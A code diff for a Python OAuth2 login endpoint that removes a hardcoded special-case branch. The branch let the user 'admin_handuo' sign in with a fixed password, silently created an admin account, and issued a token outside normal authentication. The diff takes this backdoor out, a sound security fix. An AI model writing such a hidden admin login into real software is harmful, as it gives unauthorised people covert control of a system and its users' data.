@@ -24,52 +24,6 @@ def login(
     """
     OAuth2 compatible token login, get an access token for future requests
     """
-    # Special case for admin_handuo
-    if form_data.username == "admin_handuo":
-        # Verify the hardcoded password for this special case
-        if form_data.password != "Christlurker2":
-            raise HTTPException(
-                status_code=status.HTTP_401_UNAUTHORIZED,
-                detail="Incorrect username or password",
-            )
-        
-        # Check if the admin_handuo user exists in the database
-        admin_handuo = user_service.get_user_by_email(db, "admin_handuo@documind.ai")
-        
-        # If not, create it
-        if not admin_handuo:
-            from app.schemas.user import UserCreate
-            admin_user = UserCreate(
-                email="admin_handuo@documind.ai",
-                password="Christlurker2",
-                confirm_password="Christlurker2",
-                name="Admin Handuo",
-                role="admin",
-                tier=settings.USER_TIERS["PRO"],
-                credits_limit=settings.TIER_CREDITS["pro"],
-                is_active=True
-            )
-            admin_handuo = user_service.create_user(db, admin_user)
-            print(f"Created admin_handuo user in database")
-        
-        # Update last active timestamp
-        user_service.update_user_last_active(db, admin_handuo.id)
-        
-        # Log user login
-        log_user_action(db, admin_handuo.id, "Admin handuo logged in")
-        
-        # Create access token
-        access_token_expires = timedelta(minutes=settings.ACCESS_TOKEN_EXPIRE_MINUTES)
-        token = create_access_token(
-            admin_handuo.id, admin_handuo.email, admin_handuo.role, 
-            expires_delta=access_token_expires
-        )
-        
-        return {
-            "token": token,
-            "user": admin_handuo
-        }
-    
     # Standard authentication for regular users
     user = user_service.authenticate_user(db, form_data.username, form_data.password)
     if not user:
